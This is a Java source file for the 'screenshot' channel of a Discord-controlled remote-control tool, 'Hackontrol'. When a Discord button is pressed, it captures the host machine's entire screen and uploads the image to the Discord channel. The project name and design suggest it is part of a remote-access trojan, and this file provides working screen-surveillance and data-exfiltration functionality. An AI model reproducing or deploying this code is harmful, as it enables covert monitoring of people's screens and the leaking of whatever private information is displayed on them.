package com.khopan.hackontrol.channel;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Calendar;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolButton;
import com.khopan.hackontrol.utils.HackontrolError;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.utils.FileUpload;

public class ScreenshotChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "screenshot";

	private static final String SCREENSHOT_BUTTON_IDENTIFIER = "takeScreenshot";

	private final Robot robot;

	private Throwable Errors;

	public ScreenshotChannel() {
		Robot robot;

		try {
			robot = new Robot();
		} catch(Throwable Errors) {
			robot = null;
			this.Errors = Errors;
		}

		this.robot = robot;
	}

	@Override
	public String getName() {
		return ScreenshotChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, this :: screenshot);
	}

	private void screenshot(ButtonContext context) {
		if(this.robot == null) {
			HackontrolError.throwable(context.reply(), this.Errors);
			return;
		}

		Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
		BufferedImage image = this.robot.createScreenCapture(new Rectangle(size));
		ByteArrayOutputStream stream = new ByteArrayOutputStream();

		try {
			ImageIO.write(image, "png", stream);
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.reply(), this.Errors);
			return;
		}

		byte[] byteArray = stream.toByteArray();
		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(
				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER),
				HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
	}

	private static String getScreenshotFileName() {
		try {
			Calendar calendar = Calendar.getInstance();
			return String.format("screenshot-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png",
					calendar.get(Calendar.YEAR),
					calendar.get(Calendar.MONTH) + 1,
					calendar.get(Calendar.DAY_OF_MONTH),
					calendar.get(Calendar.HOUR_OF_DAY),
					calendar.get(Calendar.MINUTE),
					calendar.get(Calendar.SECOND),
					calendar.get(Calendar.MILLISECOND)
					);
		} catch(Throwable Errors) {
			return "screenshot.png";
		}
	}
}
